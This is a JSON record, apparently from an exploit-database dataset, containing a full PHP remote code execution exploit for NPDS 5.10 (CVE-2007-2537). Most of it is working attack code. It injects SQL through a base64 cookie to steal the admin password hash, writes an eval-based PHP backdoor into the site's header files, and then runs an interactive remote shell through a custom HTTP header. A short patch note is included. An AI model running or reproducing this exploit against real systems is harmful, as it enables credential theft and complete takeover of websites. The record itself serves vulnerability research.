{
  "id": "3855",
  "title": "Net Portal Dynamic System (NPDS) 5.10 - Remote Code Execution (2)",
  "cve": "CVE-2007-2537",
  "vuln_type": "sqli",
  "code": "<?php\r\n/*---------------------------------------------------------*\\\r\nNPDS <= 5.10 - Remote Code Execution exploit\r\n\r\n[|Description:|]\r\nSecurity holes were found in NPDS 5.10.\r\n\r\nN\u00c2\u00b01: Sql Injection in cookies (File Mainfile.php lines 655 to 691).\r\nNo check is carried out on nicknames or Id which can allow an attacker\r\nto modify a SQL request so as to obtain data.\r\n\r\nN\u00c2\u00b02: SQL Injection due to a bad use of \"X_FORWARDED_FOR\" (file Mainfile.php lines 88 to 110).\r\nNPDS uses the HTTP header \"X_FORWARDED_FOR\" which normally contains the IP adress\r\nof a person using a non anonymous proxy. This Ip address is used in a SQL resquest without appropriate\r\nfiltering, and an attacker can define \"X_FORWARDED_FOR\" insering malicious SQL code.\r\n\r\n[|Advisory:|]\r\nhttp://www.aeroxteam.fr/advisory-NPDS-5.10.txt\r\n\r\n[|Solution:|]\r\nN\u00c2\u00b01: File mainfile.php, add after line 665:\r\n$cookie[0] = inval($cookie[0);\r\n$cookie[1] = addslashes($cookie[1]);\r\n$cookie[2] = addslashes($cookie[2]);\r\n\r\nN\u00c2\u00b02: Replace fonction \"getip\" (mainfile.php) by:\r\nfunction getip() {\r\n\treturn $_SERVER['REMOTE_ADDR'];\r\n}\r\n\r\nGu1ll4um3r0m41n (aeroxteam --[at]-- gmail --[dot]-- com)\r\nfor AeroX (AeroXteam.fr)\r\n(C)opyleft 2007\r\nGr33tz: Darkfig, Spamm, Math\u00c2\u00b2, Barma, NeoMorphS, Snake91, Kad, Nitr0, BlastKiller, Alkino And everybody from #aerox@irc.epiknet.org\r\n\\*---------------------------------------------------------*/\r\nif(count($argv) == 5) {\r\n\thead();\r\n\techo \"\\r\\n[+] Connection... \";\r\n\t$sock = @fsockopen($argv[1], 80, $eno, $estr, 30);\r\n\tif (!$sock) {\r\n\t\tdie(\"Failed\\r\\n\\r\\nCould not connect to \".$argv[1].\" on the port 80 !\");\r\n\t}\r\n\t########\r\n\t\r\n\techo \"OK\\r\\n\";\r\n\techo \"[+] Logging to account... \";\r\n\t$reqlogin = \"POST \".$argv[2].\"user.php HTTP/1.1\\r\\n\";\r\n\t$reqlogin .= \"Host: \".$argv[1].\"\\r\\n\";\r\n\t$reqlogin .= \"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\\r\\n\";\r\n\t$reqlogin .= \"Accept: */*\\r\\n\";\r\n\t$reqlogin .= \"Connection: close\\r\\n\";\r\n\t$reqlogin .= \"Referer: http://\".$argv[1].\"\".$argv[2].\"user.php\\r\\n\";\r\n\t$reqlogin .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n\t$reqlogin .= \"Content-Length: \".strlen(\"uname=\".$argv[3].\"&pass=\".$argv[4].\"&op=login\").\"\\r\\n\\r\\n\";\r\n\t$reqlogin .= \"uname=\".$argv[3].\"&pass=\".$argv[4].\"&op=login\";\r\n\tfwrite($sock, $reqlogin);\r\n\tunset($reqlogin);\r\n\t$pagelogin = '';\r\n\twhile(!feof($sock)) {\r\n\t\t$pagelogin .= fgets($sock);\r\n\t}\r\n\tfclose($sock);\r\n\tpreg_match(\"`Set-Cookie: user=(.*?);`\", $pagelogin, $cookie);\r\n\tif(empty($cookie[1])) {\r\n\t\tdie(\"Failed\\r\\n\\r\\nCould not login as \".$argv[3].\" !\");\r\n\t} else {\r\n\t\techo \"OK\\r\\n\";\r\n\t}\r\n\t\r\n\tif(($decoded = base64_decode($cookie[1])) !== false) {\r\n\t\t$exploded = explode(':', $decoded);\r\n\t\t$exploded[0] = \"' UNION SELECT CONCAT(0x4055534552, aid, 0x5553455240, 0x204050415353, pwd, 0x5041535340) FROM authors WHERE radminsuper=1 LIMIT 0,1 /*\";\r\n\t\t$exploded[8] = 1;\r\n\t\t$cookieuser = base64_encode(implode(':', $exploded));\r\n\t}\r\n\t########\r\n\t\r\n\techo \"[+] Getting admin password... \";\t\r\n\t$sock = @fsockopen($argv[1], 80, $eno, $estr, 30);\r\n\tif (!$sock) {\r\n\t\tdie(\"Failed\\r\\n\\r\\nCould not connect to \".$argv[1].\" on the port 80 !\");\r\n\t}\r\n\r\n\t$reqpass  = \"GET \".$argv[2].\"index.php?op=edito HTTP/1.1\\r\\n\";\r\n\t$reqpass .= \"Host: \".$argv[1].\"\\r\\n\";\r\n\t$reqpass .= \"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\\r\\n\";\r\n\t$reqpass .= \"Accept: */*\\r\\n\";\r\n\t$reqpass .= \"Connection: close\\r\\n\";\r\n\t$reqpass .= \"Cookie: user=\".$cookieuser.\"; user_language=french\\r\\n\\r\\n\";\r\n\tfwrite($sock, $reqpass);\r\n\tunset($reqpass);\r\n\t$pagepass = '';\r\n\twhile(!feof($sock)) {\r\n\t\t$pagepass .= fgets($sock);\r\n\t}\r\n\tfclose($sock);\r\n\tpreg_match(\"`@USER(.*?)USER@ @PASS(.*?)PASS@`\", $pagepass, $result);\r\n\tunset($pagepass);\r\n\t\r\n\tif(empty($result[1]) || empty($result[2])) {\r\n\t\tfclose($sock);\r\n\t\tdie(\"Failed !\\r\\n\\r\\nMaybe not vulnerable ?!\");\r\n\t} else {\r\n\t\techo \"OK\\r\\n\";\r\n\t}\r\n\t########\r\n\t\r\n\techo \"[+] Login to admin & injecting PHP code... \";\r\n\t$sock = @fsockopen($argv[1], 80, $eno, $estr, 30);\r\n\tif (!$sock) {\r\n\t\tdie(\"Failed\\r\\n\\r\\nCould not connect to \".$argv[1].\" on the port 80 !\");\r\n\t}\r\n\t\r\n\t$cookieadmin = base64_encode($result[1].':'.md5($result[2]));\r\n\t\r\n\t$reqshell  = \"POST \".$argv[2].\"admin.php?op=ConfigFiles_save HTTP/1.1\\r\\n\";\r\n\t$reqshell .= \"Host: \".$argv[1].\"\\r\\n\";\r\n\t$reqshell .= \"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\\r\\n\";\r\n\t$reqshell .= \"Accept: */*\\r\\n\";\r\n\t$reqshell .= \"Connection: close\\r\\n\";\r\n\t$reqshell .= \"Cookie: admin=\".$cookieadmin.\"; user_language=french\\r\\n\";\r\n\t$reqshell .= \"Referer: http://\".$argv[1].\"\".$argv[2].\"admin.php\\r\\n\";\r\n\t$reqshell .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n\t$reqshell .= \"Content-Length: \".strlen(\"Xtxt=\".urlencode(\"<?php\\r\\n   include(\\\"modules/aide-contextuelle/AC-header.js\\\");\\r\\n   if(!empty(\\$_SERVER['PHPSHELL'])){eval(\\$_SERVER['PHPSHELL']);die();}\\r\\n?>\").\"&Xfiles=header_head&confirm=Sauver+les+modifications\").\"\\r\\n\\r\\n\";\r\n\t$reqshell .= \"Xtxt=\".urlencode(\"<?php\\r\\n   include_once(\\\"modules/ipban/ban.php\\\");\\r\\n   if(!empty(\\$_SERVER['HTTP_PHPCODE'])){eval(urldecode(base64_decode(\\$_SERVER['HTTP_PHPCODE'])));die();}\\r\\n?>\").\"&Xfiles=header_before&confirm=Sauver+les+modifications\";\r\n\tfwrite($sock, $reqshell);\r\n\tunset($reqshell);\r\n\t$pageshell = '';\r\n\twhile(!feof($sock)) {\r\n\t\t$pageshell .= fgets($sock);\r\n\t}\r\n\tfclose($sock);\r\n\t\r\n\tif(preg_match('`location: admin\\.php\\?op=ConfigFiles`', $pageshell)) { $ok = 1; }\r\n\tunset($pageshell);\r\n\t\r\n\tif(!$ok) {\r\n\t\tdie(\"Failed\\r\\n\\r\\nUnable to write PHP Code\");\r\n\t} else {\r\n\t\techo \"OK\\r\\n\\r\\n\";\r\n\t}\r\n\t\r\n\twhile(1) {\r\n\t\tunset($exec);\r\n\t\techo \"[PhpShell@\".$argv[1].\"]$ \";\r\n\t\t$input = trim(fgets(STDIN));\r\n\t\tif($input == 'quit' || $input == 'exit') {\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\t$sock = @fsockopen($argv[1], 80, $eno, $estr, 30);\r\n\t\tif (!$sock) {\r\n\t\t\tdie(\"\\r\\nCould not connect to \".$argv[1].\" on the port 80 !\");\r\n\t\t}\r\n\t\t$req  = \"GET \".$argv[2].\"index.php?op=edito HTTP/1.1\\r\\n\";\r\n\t\t$req .= \"Host: \".$argv[1].\"\\r\\n\";\r\n\t\t$req .= \"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\\r\\n\";\r\n\t\t$req .= \"Accept: */*\\r\\n\";\r\n\t\t$req .= \"PHPCODE: \".urldecode(base64_encode($input)).\"\\r\\n\";\r\n\t\t$req .= \"Connection: close\\r\\n\\r\\n\";\r\n\t\tfwrite($sock, $req);\r\n\t\tunset($req);\r\n\t\t$headers = 0;\r\n\t\twhile(!feof($sock)) {\r\n\t\t\t$buffer = fgets($sock);\r\n\t\t\tif(!$headers) {\r\n\t\t\t\tif($buffer == \"\\r\\n\") { $headers = 1; }\r\n\t\t\t} else {\r\n\t\t\t\t$exec .= $buffer;\r\n\t\t\t}\r\n\t\t}\r\n\t\techo $exec.\"\\r\\n\\r\\n\";\r\n\t}\r\n} else {\r\n\tusage();\r\n}\r\nfunction usage() {\r\n\techo \"+------------------------------------------------------+\\r\\n\";\r\n\techo \"|      NPDS <= 5.10 Remote Code Execution exploit      |\\r\\n\";\r\n\techo \"|             By Gu1ll4um3r0m41n for AeroX             |\\r\\n\";\r\n\techo \"|              You need a user account !!              |\\r\\n\";\r\n\techo \"|   Usage: php exploit.php site.com /path/ user pass   |\\r\\n\";\r\n\techo \"+------------------------------------------------------+\\r\\n\";\r\n}\r\nfunction head() {\r\n\techo \"+----------------------------------------------+\\r\\n\";\r\n\techo \"|  MPDS <= 5.10 Remote Code Execution exploit  |\\r\\n\";\r\n\techo \"|         By Gu1ll4um3r0m41n for AeroX         |\\r\\n\";\r\n\techo \"+----------------------------------------------+\\r\\n\\r\\n\";\r\n}\r\n?>\r\n\r\n# milw0rm.com [2007-05-04]",
  "url": "https://www.exploit-db.com/exploits/3855"
}